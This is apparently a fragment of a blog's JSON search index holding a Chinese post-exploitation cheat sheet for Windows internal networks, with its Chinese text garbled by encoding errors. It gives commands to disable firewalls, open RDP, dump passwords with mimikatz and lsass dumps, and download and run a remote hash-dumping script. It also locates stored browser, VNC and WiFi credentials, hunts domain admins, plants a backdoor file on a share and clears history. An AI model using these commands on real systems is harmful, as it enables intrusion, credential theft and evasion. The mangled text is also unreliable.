æŸ¥çœ‹exeçš„è¯¦ç»†ä¿¡æ¯","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"å·¥å…·é›†","slug":"å·¥å…·é›†","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7%E9%9B%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å·¥å…·","slug":"A-OS/Windows/å·¥å…·","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€windowsã€‘å†…ç½‘ä¿¡æ¯æ”¶é›†","date":"2023-10-27T01:24:02.033Z","path":"A_OS/Windows/å·¥å…·/ã€windowsã€‘å†…ç½‘ä¿¡æ¯æ”¶é›†/","text":"0x00 åˆ†æå…¥å£æœºå™¨ åœ¨ææƒå®Œæˆåï¼Œå°½å¯èƒ½å¤šçš„æ”¶é›†æ­¤æœºå™¨ä¸Šçš„å„ç§ä¿¡æ¯ã€‚ å½“å‰æœºå™¨çš„è§’è‰² å½“å‰æœºå™¨æ‰€åœ¨ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„ å½“å‰æœºå™¨çš„ç½‘ç»œä½ç½®/åŒºåŸŸ 0x01 æ”¶é›†åŸºç¡€ä¿¡æ¯ Main ipã€è¿›ç¨‹ã€ç«¯å£ã€æœåŠ¡ã€å…±äº«ã€è½¯ä»¶ã€è¡¥ä¸ã€wifiã€rdpã€ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071------------------ç³»ç»Ÿ---------------------set # æŸ¥çœ‹ç¯å¢ƒå˜é‡wmic bios # æŸ¥çœ‹biosä¿¡æ¯fsutil fsinfo drives # æŸ¥çœ‹ç›˜ç¬¦systeminfo # ç³»ç»Ÿç‰ˆæœ¬systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;------------------ipä¸ç½‘æ®µ---------------------ping -a ip # ipåæŸ¥ä¸»æœºånetstat -A ip # åŒä¸Šipconfig /all #æŸ¥çœ‹ipè¯¦ç»†ä¿¡æ¯,å…³æ³¨æ˜¯å¦å¤šç½‘å¡ã€IPã€DNSipconfig /displaydns #æŸ¥çœ‹DNSç¼“å­˜route print #æŸ¥çœ‹è·¯ç”±arp -a #æŸ¥çœ‹arpç¼“å­˜è¡¨net view #æŸ¥è¯¢æœºå™¨åˆ—è¡¨type C:\\Windows\\System32\\drivers\\etc\\hosts #æŸ¥çœ‹hostsâ½‚ä»¶---------------ç«¯å£--------------------netstat -ano #æŸ¥çœ‹ç«¯â¼å¼€æ”¾æƒ…å†µnetstat -ano|findstr 80 #æŸ¥çœ‹80ç«¯â¼å¯¹åº”çš„PID---------------æœåŠ¡--------------------wmic service list brief # æŸ¥çœ‹å®‰è£…çš„æ‰€æœ‰æœåŠ¡ä¿¡æ¯net start # å·²å¯åŠ¨çš„æœåŠ¡---------------å…±äº«--------------------wmic share get name,path,status # æŸ¥çœ‹å…±äº«ä¿¡æ¯net use # æŸ¥çœ‹å·²å»ºç«‹çš„è¿æ¥net share # æŸ¥çœ‹å…±äº«net session # æŸ¥çœ‹ä¼šè¯net view \\ip # æŸ¥è¯¢æŒ‡å®šIPå…±äº«---------------å¼€æœºè‡ªå¯åŠ¨ç¨‹åº--------------------wmic startup get command,caption---------------å®‰è£…çš„ç¨‹åº--------------------wmic product get name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;---------------è®¡åˆ’ä»»åŠ¡--------------------schtasks /query /fo LIST /v &gt; ed1dassc.txt---------------è¡¥ä¸ä¿¡æ¯ï¼ˆææƒï¼‰--------------------wmic qfe get Caption,Description,HotFixID,InstalledOnsysteminfo---------------è¿›ç¨‹åˆ—è¡¨ï¼ˆå…æ€ï¼‰--------------------wmic process list brief #å½“å‰è¿›ç¨‹åˆ—è¡¨tasklist #å½“å‰è¿›ç¨‹åˆ—è¡¨tasklist /svc #æŸ¥çœ‹è¿›ç¨‹ã€pidã€æœåŠ¡taskkill /f /t /im xx.exe #æ€æ­»xx.exeè¿›ç¨‹taskkill /F -pid 520 #æ€æ­»pidä¸º520çš„è¿›ç¨‹wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed---------------æŸ¥è¯¢IEæµè§ˆå™¨çš„ä»£ç†ä¿¡æ¯--------------------reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;---------------cmdã€powershellï¼ˆv3ä»¥ä¸‹ï¼‰å½“å‰çª—å£çš„å†å²å‘½ä»¤--------------------Get-History | Format-List -Property * # æŸ¥è¯¢ powershell å½“å‰çª—â¼å†å²æ“ä½œè®°å½•Clear-History # åˆ é™¤ powershell å½“å‰çª—â¼å†å²æ“ä½œè®°å½•Clear-History -Id 3 # åˆ é™¤ æŒ‡å®š ID çš„å†å²æ“ä½œè®°å½•doskey /h # æŸ¥çœ‹ cmd çš„å†å²æ“ä½œè®°å½•doskey /reinstall # åˆ é™¤ cmd çš„å†å²æ“ä½œè®°å½•# powershell v3ã€v4 ç‰ˆæœ¬éœ€è¦å®‰è£…Get-PSReadlineOptionmsiexec /q /i PackageManagement_x64.msi# æŸ¥çœ‹ powershellv5 å†å²æ“ä½œè®°å½•type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt---------------æ‚ä¸ƒæ‚å…«-------------------- ç”¨æˆ·ä¸ç»„ä¿¡æ¯ 12345678910111213141516---------------è´¦æˆ·å’Œå¯†ç ä¿¡æ¯------------------whoami /all #æŸ¥è¯¢å½“å‰â½¤æˆ·æƒé™ç­‰net user #åªæ˜¾ç¤ºæœ¬æœºçš„â½¤æˆ·ï¼Œä¸æ˜¾ç¤ºåŸŸâ½¤æˆ·net user &lt;xx&gt; #æŸ¥çœ‹â½¤æˆ·xxçš„å…·ä½“ä¿¡æ¯wmic useraccount get #æŸ¥çœ‹æœ¬æœºç”¨æˆ· æˆ– åŸŸå†…æ‰€æœ‰è´¦æˆ·wmic useraccount get Caption,LocalAccount,Disabled #net localgroup #æŸ¥çœ‹æœ¬åœ°ç»„net localgroup administrators #æŸ¥çœ‹æœ¬åœ°ç»„administratorsç®¡ç†å‘˜ç»„ã€‚é™¤äº†æ˜¾ç¤ºæœ¬æœºä¸­â½¤æˆ·ï¼Œè¿˜ä¼šæ˜¾ç¤ºåŸŸâ½¤æˆ·(å‰ææ˜¯è¯¥åŸŸâ½¤æˆ·åœ¨æœ¬æœºçš„Administratorsç»„å†…)query user æˆ– quser #æŸ¥è¯¢å½“å‰åœ¨çº¿â½¤æˆ·qwinsta #æŸ¥è¯¢å½“å‰åœ¨çº¿â½¤æˆ·qwinsta /SERVER:IP #æŸ¥çœ‹è¿œç¨‹ç™»å½•æƒ…å†µquery session #æŸ¥è¯¢ä¼šè¯query termserver #æŸ¥è¯¢è¿œç¨‹æ¡Œâ¾¯ä¸»æœºåˆ—è¡¨net accounts #æŸ¥çœ‹æœ¬åœ°å¯†ç ç­–ç•¥ RDP æœåŠ¡å¼€å…³ 1234567891011121314---------------è¿œç¨‹æ¡Œé¢æœåŠ¡--------------------#æŸ¥ç«¯å£ 0xd3d &gt; 3389REG query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber#æ˜¯å¦å¼€å¯äº†rdpæœåŠ¡ï¼š0x1å…³é—­ï¼Œ0x0å¼€å¯REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections#2003å¼€å¯è¿œç¨‹æ¡Œé¢wmic PATH win32_terminalservicesetting WHERE (_Class!=&quot;&quot;) CALL SetAllowTSConnections 1#2008ã€2012å¼€å¯è¿œç¨‹æ¡Œé¢wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f é˜²ç«å¢™å¼€å…³ &amp; ç­–ç•¥é…ç½® 123456789101112131415161718---------------é˜²ç«å¢™å¼€å…³ &amp; ç­–ç•¥é…ç½®--------------------netsh firewall show config #æŸ¥çœ‹é˜²ç«å¢™é…ç½®#2003ä¹‹å‰æ“ä½œnetsh firewall set opmode disable #å…³é—­é˜²ç«å¢™netsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable #å…è®¸ncçš„å…¨éƒ¨é“¾æ¥#2003ä¹‹åæ“ä½œnetsh advfirewall set allprofiles state off #å…³é—­é˜²ç«å¢™netsh advfirewall set publicprofile state off #å…³é—­é˜²ç«å¢™ï¼Œ??##å…è®¸ncçš„å…¥ç«™ã€å‡ºç«™ã€TCP3389è¿›ç«™è¿æ¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \\nc.exe&quot;netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \\nc.exe&quot;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow##è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½®netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; è‡ªåŠ¨åŒ–æ”¶é›†è„šæœ¬ï¼šEmpireã€VBS è„šæœ¬ åˆ¤æ–­æ˜¯å¦åœ¨åŸŸä¸­ 0x02 æ”¶é›†æ•æ„Ÿä¿¡æ¯ æŠ“ Win å¯†ç å’Œ hash 123456789101112131415# win10æˆ–2012R2ä»¥ä¸Šæ—¶,é»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œéœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨é‡å¯åæ‰èƒ½ã€‚reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f# ç®€å•æŠ“å¯†ç mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;# è½¬å‚¨lsass.exeæˆdmpæ–‡ä»¶ï¼Œå†ä½¿ç”¨mimikatzæœ¬åœ°è¯»å–ï¼ˆè§„é¿ï¼‰procdump64.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;# powershellè¿œç¨‹åŠ è½½powershell IEX (New-Object Net.WebClient).DownloadString(â€˜https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1â€™);Get-PassHashes# è½¬å‚¨SAMæ–‡ä»¶ï¼Œå†ä½¿ç”¨secretsdump.pyæœ¬åœ°è¯»å–ï¼ˆè§„é¿ï¼‰python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL win æ—¥å¿— - RDP ç™»å½•ç—•è¿¹ å†…ç½‘ä½¿ç”¨ RDP çš„æœºå™¨å¤§æ¦‚ç‡æ˜¯è¿ç»´æˆ–é«˜æƒé™æœºå™¨ï¼Œå¯ç­›é€‰ LogonType ä¸º 10 çš„ Win æ—¥å¿—ï¼Œå®šä½ ipï¼Œç„¶å ping -a &lt;ip&gt; 123wevtutil qe /?wevtutil qe Security /c: 3 /rd: true /f:text # 3æ¡ã€æœ€è¿‘çš„ã€txtæ ¼å¼ï¼Œ/q xpathè¯­æ³•wevtutil qe security /q:&quot;*[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;] and System[(EventID=4624)]]&quot; /f:text /rd:true /c:10 æµè§ˆå™¨ **ä¸€æŠŠæ¢­ï¼š**HackBrowserData https://github.com/moonD4rk/HackBrowserData Chrome 12345678#ç”¨æˆ·æ•°æ®ç›®å½• %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\#ç¼“å­˜ç›®å½• %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\#ä¹¦ç­¾ %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Bookmarks#Cookie %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies#æµè§ˆå†å² %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History#å½“å‰çš„session %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Current Session#è´¦æˆ·å¯†ç  %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1\\Login Data QQ æµè§ˆå™¨ 12345678â½¤æˆ·æ•°æ®â½¬å½• %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Defaultç¼“å­˜â½¬å½• %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\ä¹¦ç­¾ %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\BookmarksCookie %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Cookiesæµè§ˆå†å² %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Historyå½“å‰çš„session %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Current Sessionè´¦å·å¯†ç  %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Login Data %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\xxxxxxxxxxx\\6 360 æµè§ˆå™¨ 1è´¦å·å¯†ç â½‚ä»¶ %APPDATA%\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db firefox 1è´¦å·å¯†ç â½‚ä»¶ %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json IE/Edge 1ä¹¦ç­¾â½‚ä»¶ %USERPROFILE%\\Favorites\\xx.url è¿œç¨‹ç®¡ç†å·¥å…· æ•°æ®åº“ç®¡ç†å·¥å…·ã€è¿œç¨‹ç™»å½• navicat 1234567MySQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers&lt;your connection name&gt;MariaDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers&lt;your connection name&gt;MongoDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers&lt;your connection name&gt;MSSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers&lt;your connection name&gt;Oracle HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers&lt;your connection name&gt;PostgreSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers&lt;your connection name&gt;SQLite HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers&lt;your connection name&gt; SecurtCRT 12xp/win2003 C:\\Documents and Settings\\USERNAME\\Application Data\\VanDyke\\Config\\Sessionswin7/win2008ä»¥ä¸Š %APPDATA%\\VanDyke\\Config\\Sessions XShell 12Xshell 5 %userprofile%\\Documents\\NetSarang\\Xshell\\SessionsXshell 6 %userprofile%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions VNC 1234RealVNC HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver PasswordTightVNC HKEY_CURRENT_USER\\Software\\TightVNC\\Server Value Password or PasswordViewOnlyTigerVNC HKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4 PasswordUltraVNC C:\\Program Files\\UltraVNC\\ultravnc.ini passwd or passwd2 VPN 1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit Wifi è´¦å·å¯†ç  123456789101112131415161718æŸ¥çœ‹å¸®åŠ© netsh wlan helpåˆ—å‡ºâ½†çº¿æ¥ netsh wlan show interfaceå¼€å¯â½†çº¿æ¥ netsh interface set interface &quot;Interface Name&quot; enabledæ˜¾ç¤ºè¿æ¥è¿‡çš„WIFIçš„é…ç½®â½‚ä»¶ netsh wlan show profilesè¿æ¥æŒ‡å®šwifi netsh wlan connect name=xxxxæ–­å¼€è¿æ¥ netsh wlan disconnectæŸ¥çœ‹è¿æ¥è¿‡çš„WIFIçš„é…ç½®â½‚ä»¶(åŒ…å«è´¦å·å¯†ç )ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™æ‰§â¾ï¼Œç„¶åä½¿â½¤typeå‘½ä»¤æŸ¥çœ‹é…ç½®â½‚ä»¶netsh wlan export profile interface=WLAN key=clear folder=C:\\type C:\\xxx.xmlæ‰¹é‡æ˜¾ç¤ºwifiè´¦å·å¯†ç for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clearå…¶å®ƒå¸¸â½¤çš„å‘½ä»¤ï¼š å¯¼å‡ºé…ç½®â½‚ä»¶ï¼šnetsh wlan export profile key=clear åˆ é™¤é…ç½®â½‚ä»¶ï¼šnetsh wlan delete profile name=&quot;&quot; æ·»åŠ é…ç½®â½‚ä»¶ï¼šnetsh wlan add profile filename=&quot;&quot; 0x03 åŸŸä¿¡æ¯æ”¶é›† åˆ¤æ–­æ˜¯å¦åœ¨åŸŸä¸­ æœ¬åœ°æ™®é€šç”¨æˆ·ï¼šåªèƒ½æŸ¥è¯¢æœ¬æœºä¿¡æ¯ æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ï¼šå¯ä»¥æŸ¥åŸŸå†…ä¿¡æ¯ã€‚æå‡ Ntauthority æˆ– System æƒé™åä½œä¸ºåŸŸå†…çš„æœºå™¨è´¦æˆ·è¿›è¡Œè®¤è¯ã€‚ åŸŸç”¨æˆ·ï¼šå¯ä»¥æŸ¥åŸŸå†…ä¿¡æ¯ã€‚ä½¿ç”¨ kerberos åè®®è‡ªåŠ¨è®¤è¯ã€‚ æœ¬åœ°æ™®é€šç”¨æˆ·ï¼šæœ¬æœºè®¡ç®—æœºå\\john æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ï¼šæœ¬æœºè®¡ç®—æœºå\\administrator åŸŸç”¨æˆ·ï¼šåŸŸå\\user01 å‡ ç§åˆ¤æ–­æ–¹å¼ 123456789101112131415161718---------------åˆ©ç”¨è®¡ç®—æœºåå’Œç”¨æˆ·ååˆ¤æ–­--------------------echo %userdomain% &amp; hostname &amp;&amp; whoami # whoami å‰çš„å°±æ˜¯åŸŸåæˆ–ä¸»æœºåset l # æœ¬æœºä¸»æœºåã€åŸŸæ§ä¸»æœºå---------------åˆ©ç”¨DNSæœåŠ¡å™¨ä¸€èˆ¬ä¹Ÿéƒ¨ç½²åœ¨DCä¸Šåˆ¤æ–­--------------------ipconfig /all # &lt;ä¸» DNS åç¼€&gt;ã€&lt;DNS åç¼€æœç´¢åˆ—è¡¨&gt; å°±æ˜¯åŸŸånslookup &lt;ä¸» DNS åç¼€&gt; # å¾—åˆ°åŸŸæ§ip---------------åˆ©ç”¨æ—¶é—´æœåŠ¡å™¨ä¸€èˆ¬ä¹Ÿéƒ¨ç½²åœ¨DCä¸Šåˆ¤æ–­--------------------net time /domain å‘ç”Ÿç³»ç»Ÿé”™è¯¯ 5 #å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ· \\\\XXX çš„å½“å‰æ—¶é—´ #å­˜åœ¨åŸŸï¼Œä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ· æ‰¾ä¸åˆ°åŸŸ WORKGROUP çš„åŸŸæ§åˆ¶å™¨ã€‚ #å½“å‰ä¸ºå·¥ä½œç»„ç¯å¢ƒ---------------ç»“æœä¸ä¸ºWORKGROUPåˆ™åœ¨åŸŸä¸­--------------------systeminfo | findstr åŸŸ:net config workstation | findstr å·¥ä½œç«™åŸŸ æ”¶é›†åŸŸå†…ä¿¡æ¯ æŸ¥è¯¢åŸŸåã€åŸŸç­–ç•¥ã€åŸŸä¿¡ä»»å…³ç³»ã€åŸŸè®¡ç®—æœºåˆ—è¡¨ã€åŸŸæ§ã€åŸŸç®¡ã€åŸŸæ§ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950whoami /all # è·å–ç”¨æˆ·SIDï¼ŒSIDå»æ‰åå››ä½å°±æ˜¯è®¡ç®—æœº/åŸŸSIDsc showsid server # è·å–æŸæœåŠ¡çš„SID---------------æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸå--------------------net view //æ— å‚æ—¶ï¼šæŸ¥çœ‹å½“å‰åŸŸæˆ–ç»„å†…çš„å…¶å®ƒè®¡ç®—æœºåç§°åˆ—è¡¨net view /domain //æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸnet view /all \\\\&lt;ip/hostname&gt; //å¸¦å‚æ•°ï¼šæŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºçš„æ–‡ä»¶å…±äº«åˆ—è¡¨ï¼Œé”™è¯¯5dir /Q \\\\&lt;ip/hostname&gt;\\&lt;å…±äº«å&gt; //æŸ¥çœ‹æŸä¸ªå…±äº«åtype \\\\&lt;ip/hostname&gt;\\&lt;å…±äº«å&gt;\\&lt;æ–‡ä»¶å&gt; //æŸ¥çœ‹å…±äº«æ–‡ä»¶copy .\\backdoor.txt \\\\&lt;ip/hostname&gt;\\&lt;å…±äº«å&gt; //ä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°ç›®æ ‡å…±äº«--------------è·å–åŸŸç­–ç•¥ä¿¡æ¯--------------------nltest /domain_trusts //è·å–åŸŸä¿¡ä»»ä¿¡æ¯net accounts /domain //è·å–åŸŸå¯†ç ç­–ç•¥net group /domain //æŸ¥çœ‹æ‰€æœ‰åŸŸç»„å--------------è·å–åŸŸè®¡ç®—æœºåˆ—è¡¨--------------------net view /domain:GOD //æŸ¥çœ‹godåŸŸä¸­çš„è®¡ç®—æœºåˆ—è¡¨net group &quot;domain computers&quot; /domain //æŸ¥çœ‹æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨--------------å®šä½åŸŸæ§--------------------nltest /DCLIST:&lt;åŸŸå&gt;nslookup -type=SRV _ldap._tcpnet time /domain //ä¸€èˆ¬æ—¶é—´æœåŠ¡å™¨ä¸ºä¸»/å¤‡åŸŸæ§net group &quot;domain controllers&quot; /domain //é€šè¿‡åŸŸæ§ç»„æŸ¥è¯¢netdom query pdc //æŸ¥çœ‹æ‰€æœ‰åŸŸæ§çš„ä¸»æœºåï¼Œå‘½ä»¤ä¸å¯ç”¨ã€‚ã€‚--------------æŸ¥åŸŸç®¡ç†å‘˜ç”¨æˆ·--------------------net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain--------------æŸ¥è¯¢åŸŸç”¨æˆ·--------------------net localgroup administrators //æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆå› ä¸ºDomain Adminsç»„é»˜è®¤å±äºåŸŸå†…æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼‰net user /domain //æŸ¥çœ‹åŸŸä¸­æ‰€æœ‰çš„ç”¨æˆ·åï¼ŒåŒ…æ‹¬åŸŸç®¡ç†net user &lt;ç”¨æˆ·å&gt; /domain //æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†åˆ—è¡¨wmic useraccount get /all //è·å–åŸŸç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯dsquery //åŸŸæ§ç®¡ç†å·¥å…·dsquery user //æŸ¥çœ‹åŸŸå†…ç”¨æˆ·dsquery computer - æŸ¥æ‰¾ç›®å½•ä¸­çš„è®¡ç®—æœºdsquery contact - æŸ¥æ‰¾ç›®å½•ä¸­çš„è”ç³»äººdsquery subnet - æŸ¥æ‰¾ç›®å½•ä¸­çš„å­ç½‘dsquery group - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„dsquery ou - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç»„ç»‡å•ä½dsquery site - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç«™ç‚¹dsquery server - æŸ¥æ‰¾ç›®å½•ä¸­çš„åŸŸæ§åˆ¶å™¨dsquery user - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç”¨æˆ·dsquery quota - æŸ¥æ‰¾ç›®å½•ä¸­çš„é…é¢dsquery partition - æŸ¥æ‰¾ç›®å½•ä¸­çš„åˆ†åŒºdsquery * - ç”¨é€šç”¨çš„ LDAP æŸ¥è¯¢æŸ¥æ‰¾ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡ åŸŸææƒ é€šè¿‡æ—¥å¿—å®šä½ï¼šæŒ‡æœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬æˆ– Wevtutil å·¥å…·å¯¼å‡ºæŸ¥çœ‹ é€šè¿‡ä¼šè¯/è¿›ç¨‹å®šä½ï¼šæŒ‡åŸŸå†…æ¯å°æœºå™¨çš„ç™»å½•ä¼šè¯ï¼Œå¯ä»¥ä½¿ç”¨ netsess.exeã€PowerView ç­‰å·¥å…·åŒ¿åæŸ¥è¯¢ã€‚ åŸŸææƒ - å®šä½åŸŸç®¡ç†å‘˜ æ¼æ´æ‹¿æœºå™¨ï¼Œç„¶åæŠ“åŸŸç®¡æ˜æ–‡æˆ– hashï¼Ÿ PS: å½“æ‹¿ä¸‹è¾¹ç•ŒæœåŠ¡å™¨è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ—¶ï¼Œéœ€è¦å…ˆçŸ¥é“å½“å‰åŸŸç”¨æˆ·çš„ç™»å½•ä½ç½®ã€æ˜¯å¦æ˜¯å…¶å®ƒç³»ç»Ÿçš„æœ¬åœ°ç®¡ç†å‘˜ã€æ‰€å±ç»„ã€æ˜¯å¦æœ‰æƒè®¿é—®æ–‡ä»¶å…±äº«ã€‚ æœåŠ¡å™¨åŠ åŸŸåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°† domain admins ç»„åŠ åˆ°åŸŸæˆå‘˜æœåŠ¡å™¨çš„ administrators ç»„ï¼Œå› æ­¤åŸŸç®¡ç†å‘˜ç»„çš„æˆå‘˜å‡å¯è®¿é—®æœ¬åœ°è®¡ç®—æœºï¼Œå¹¶å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚ å¸¸ç”¨å·¥å…·ï¼špsloggedon.exeã€PVEFindADUser.exeã€netsess.exeã€hunterã€NetViewã€PowerShell - PowerView bloodyAD.py æŸ¥è¯¢åŸŸå†…ä¿¡æ¯çš„ä¸€æ¬¾å·¥å…·ï¼Œä¸»è¦ç”¨æ¥ä¿®æ”¹è´¦æˆ·å±æ€§ã€ æ–°å¢æœºå™¨è´¦æˆ·ï¼Œå…¶å®ƒæŸ¥è¯¢åŠŸèƒ½è¾ƒä¸ºå¸¸è§„ã€‚ psloggedon.exe net session å¯ä»¥æŸ¥çœ‹è°ä½¿ç”¨äº†æœ¬æœºèµ„æºï¼Œä½¿ç”¨ psloggedon å¯ä»¥æŸ¥çœ‹æœ¬åœ°ç™»å½•çš„ç”¨æˆ·å’Œé€šè¿‡æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºè¿›è¡Œèµ„æºç™»å½•çš„ç”¨æˆ·ã€‚åŸç†æ˜¯ï¼šè°ƒç”¨ NetSessionEnum API æ£€æŸ¥æ³¨å†Œè¡¨ HKEY_USERS é¡¹çš„ key å€¼æ¥æŸ¥è¯¢è°ç™»é™†è¿‡ã€‚ 12345psloggedon.exe - #psloggedon.exe -l #ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•psloggedon.exe -x #ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´psloggedon.exe \\\\&lt;è®¡ç®—æœºå&gt; #åˆ—å‡ºæŒ‡å®šè®¡ç®—æœºçš„ç™»å½•ä¿¡æ¯psloggedon.exe &lt;ç”¨æˆ·å&gt; #æŒ‡å®šç”¨æˆ·åï¼Œåœ¨ç½‘ç»œç§æœç´¢è¯¥ç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºã€‚ PVEFindADUser.exe PVEFindADUser ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•çš„ä½ç½®ã€æšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ã€é€šè¿‡ RDP ç™»å½•çš„ç”¨æˆ·ã€ç”¨äºè¿è¡ŒæœåŠ¡å™¨å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ï¼Œè¯¥å·¥å…·éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚ 123456789netview.exe -h #å¸®åŠ©netview.exe -f filename.txt #æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„æ–‡ä»¶netview.exe -e filename.txt 